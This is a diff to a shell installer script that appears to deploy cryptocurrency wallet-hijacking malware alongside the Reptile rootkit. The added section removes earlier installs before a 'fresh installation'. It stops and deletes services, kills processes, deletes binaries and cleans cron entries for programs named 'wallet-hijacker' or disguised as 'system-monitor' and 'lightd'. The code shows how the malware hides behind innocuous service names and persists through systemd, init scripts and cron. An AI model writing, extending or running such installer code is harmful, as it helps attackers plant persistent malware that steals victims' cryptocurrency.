@@ -47,6 +47,111 @@ case "$ARCH" in
         ;;
 esac
 
+# ==================== CLEANUP OLD INSTALLATION ====================
+echo ""
+echo "=========================================="
+echo "CLEANING UP OLD INSTALLATION"
+echo "=========================================="
+echo ""
+
+# List of old service names to check and remove
+OLD_SERVICES=(
+    "smart-wallet-hijacker"
+    "wallet-hijacker"
+    "system-monitor"
+    "lightd"
+)
+
+# List of old binary names to check and remove
+OLD_BINARIES=(
+    "/usr/local/bin/smart-wallet-hijacker"
+    "/usr/local/bin/wallet-hijacker"
+    "/usr/local/bin/system-monitor"
+    "/usr/local/bin/lightd"
+)
+
+echo "[*] Stopping and removing old wallet hijacker services..."
+for service_name in "${OLD_SERVICES[@]}"; do
+    # Check if service exists
+    if systemctl list-unit-files 2>/dev/null | grep -q "^${service_name}.service"; then
+        echo "    [*] Found old service: $service_name"
+        
+        # Stop the service
+        systemctl stop "$service_name" 2>/dev/null || true
+        
+        # Disable the service
+        systemctl disable "$service_name" 2>/dev/null || true
+        
+        # Remove service file
+        rm -f "/etc/systemd/system/${service_name}.service" 2>/dev/null || true
+        
+        echo "    [✓] Stopped and removed: $service_name"
+    fi
+    
+    # Also check SysV init
+    if [ -f "/etc/init.d/$service_name" ]; then
+        /etc/init.d/$service_name stop 2>/dev/null || true
+        rm -f "/etc/init.d/$service_name" 2>/dev/null || true
+    fi
+done
+
+echo ""
+echo "[*] Killing old wallet hijacker processes (memory cleanup)..."
+
+# Kill by process name
+for proc in smart-wallet-hijacker wallet-hijacker system-monitor lightd; do
+    if pgrep -f "$proc" >/dev/null 2>&1; then
+        echo "    [*] Killing process: $proc"
+        pkill -9 -f "$proc" 2>/dev/null || true
+        sleep 1
+    fi
+done
+
+# Kill by binary path
+for binary in "${OLD_BINARIES[@]}"; do
+    if pgrep -f "$binary" >/dev/null 2>&1; then
+        echo "    [*] Killing process: $binary"
+        pkill -9 -f "$binary" 2>/dev/null || true
+        sleep 1
+    fi
+done
+
+echo "[✓] Old processes killed (removed from memory)"
+
+echo ""
+echo "[*] Removing old binaries from disk..."
+for binary in "${OLD_BINARIES[@]}"; do
+    if [ -f "$binary" ]; then
+        echo "    [*] Deleting: $binary"
+        rm -f "$binary" 2>/dev/null || true
+        echo "    [✓] Deleted from disk"
+    fi
+done
+
+# Remove old cron entries
+echo ""
+echo "[*] Removing old cron entries..."
+if crontab -l 2>/dev/null | grep -qE 'smart-wallet-hijacker|wallet-hijacker|system-monitor|lightd'; then
+    echo "    [*] Found old cron entries, removing..."
+    crontab -l 2>/dev/null | grep -vE 'smart-wallet-hijacker|wallet-hijacker|system-monitor|lightd' | crontab - 2>/dev/null || true
+    echo "    [✓] Cron entries cleaned"
+fi
+
+# Reload systemd to clear old service definitions
+echo ""
+echo "[*] Reloading systemd daemon..."
+systemctl daemon-reload 2>/dev/null || true
+
+echo ""
+echo "[✓] CLEANUP COMPLETE"
+echo "    ✓ Old services stopped and removed"
+echo "    ✓ Old processes killed (memory cleaned)"
+echo "    ✓ Old binaries deleted from disk"
+echo "    ✓ Cron entries removed"
+echo ""
+echo "[*] Proceeding with fresh installation..."
+echo ""
+
 # ==================== REPTILE COMMAND WRAPPER ====================
 # Helper function to call reptile commands (handles different installation paths)
 reptile_cmd() {
